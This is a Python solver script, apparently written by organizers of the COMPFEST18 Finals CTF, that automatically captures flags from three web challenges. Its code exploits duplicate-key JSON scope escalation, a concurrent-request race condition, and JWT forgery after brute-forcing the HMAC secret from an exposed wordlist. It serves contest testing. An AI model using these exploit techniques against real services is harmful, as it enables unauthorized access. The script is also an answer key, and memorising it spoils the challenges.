#!/usr/bin/env python3
"""Organizer solver for the COMPFEST18 Finals web challenges.

Organizer-only. Never ship this to participants; the participant ZIPs in each
challenge public/ folder contain the README only.

Usage:
    python solve.py                      # all challenges on 127.0.0.1
    python solve.py --host 34.1.203.129  # remote deployment
    python solve.py --only aurora
"""
import argparse
import base64
import hashlib
import hmac
import json
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor


def http(base, path, method="GET", data=None, headers=None, raw=None, timeout=8, as_text=False):
    body = raw if raw is not None else (json.dumps(data).encode() if data is not None else None)
    hdrs = dict(headers or {})
    if raw is None and data is not None:
        hdrs.setdefault("Content-Type", "application/json")
    request = urllib.request.Request(base + path, data=body, headers=hdrs, method=method)
    with urllib.request.urlopen(request, timeout=timeout) as response:
        payload = response.read().decode()
    return payload if as_text else json.loads(payload)


def solve_aurora(base, port):
    root = f"{base}:{port}"
    raw = (b'{"shipment":"AUR-1048","scope":"partner","artifact":"dispatch-note",'
           b'"scope":"control-room","artifact":"sealed-export"}')
    approval = http(root, "/api/manifests/preview", "POST", raw=raw)["approvalId"]
    job = http(root, "/api/manifests/commit", "POST", {"approvalId": approval})["jobId"]
    time.sleep(0.4)
    handoff = http(root, "/api/jobs/" + job)["handoff"]
    return http(root, "/api/exports/" + handoff)["label"]


def solve_queue(base, port):
    root = f"{base}:{port}"
    claim = http(root, "/api/claims/start", "POST")

    def redeem(lane):
        return http(root, "/api/claims/redeem", "POST", {
            "claimId": claim["claimId"], "token": claim["claimToken"], "lane": lane
        })["fragment"]

    with ThreadPoolExecutor(max_workers=3) as pool:
        fragments = list(pool.map(redeem, ["north", "east", "west"]))
    handoff = http(root, "/api/claims/assemble", "POST", {
        "claimId": claim["claimId"], "fragments": fragments
    })["handoff"]
    return http(root, "/api/releases/" + handoff)["label"]


def b64(value):
    return base64.urlsafe_b64encode(value).rstrip(b"=")


def sign(unsigned, secret):
    return b64(hmac.new(secret.encode(), unsigned, hashlib.sha256).digest()).decode()


def recover_secret(root, header, payload, signature):
    path = None
    for line in http(root, "/robots.txt", as_text=True).splitlines():
        if line.lower().startswith("disallow:"):
            path = line.split(":", 1)[1].strip()
    if not path:
        raise RuntimeError("no disallowed path in robots.txt")
    unsigned = f"{header}.{payload}".encode()
    for word in http(root, path, as_text=True).splitlines():
        if hmac.compare_digest(sign(unsigned, word), signature):
            return word
    raise RuntimeError("signing secret not found in wordlist")


def solve_snow(base, port):
    root = f"{base}:{port}"
    token = http(root, "/api/session")["session"]
    header, payload, signature = token.split(".")
    secret = recover_secret(root, header, payload, signature)

    claims = {"sub": "public-console", "role": "reviewer", "aud": "incident-relay",
              "channel": "snowblind", "iat": 0}
    header_obj = json.loads(base64.urlsafe_b64decode(header + "==="))
    new_header = b64(json.dumps(header_obj, separators=(",", ":")).encode()).decode()
    new_payload = b64(json.dumps(claims, separators=(",", ":")).encode()).decode()
    unsigned = f"{new_header}.{new_payload}"
    forged = f"{unsigned}.{sign(unsigned.encode(), secret)}"

    handoff = http(root, "/api/relay/handoff", headers={"Authorization": "Bearer " + forged})["handoff"]
    return http(root, "/api/exports/" + handoff)["label"]


CHALLENGES = {
    "aurora": ("Aurora Manifest Exchange", 4007, solve_aurora),
    "queue": ("Queue Zero", 4013, solve_queue),
    "snow": ("Snowblind Relay", 4021, solve_snow),
}


def main():
    parser = argparse.ArgumentParser(description="COMPFEST18 Finals web solver (organizer-only)")
    parser.add_argument("--host", default="http://127.0.0.1", help="target host URL")
    parser.add_argument("--only", choices=sorted(CHALLENGES), help="solve a single challenge")
    parser.add_argument("--aurora", type=int, default=4007)
    parser.add_argument("--queue", type=int, default=4013)
    parser.add_argument("--snow", type=int, default=4021)
    args = parser.parse_args()

    base = args.host.rstrip("/")
    ports = {"aurora": args.aurora, "queue": args.queue, "snow": args.snow}
    names = [args.only] if args.only else ["aurora", "queue", "snow"]

    failures = 0
    for key in names:
        label, _, solver = CHALLENGES[key]
        port = ports[key]
        try:
            flag = solver(base, port)
            print(f"[+] {label:<26} {flag}")
        except Exception as error:  # noqa: BLE001 - organizer tool
            failures += 1
            print(f"[-] {label:<26} FAILED: {error}")
    return 1 if failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
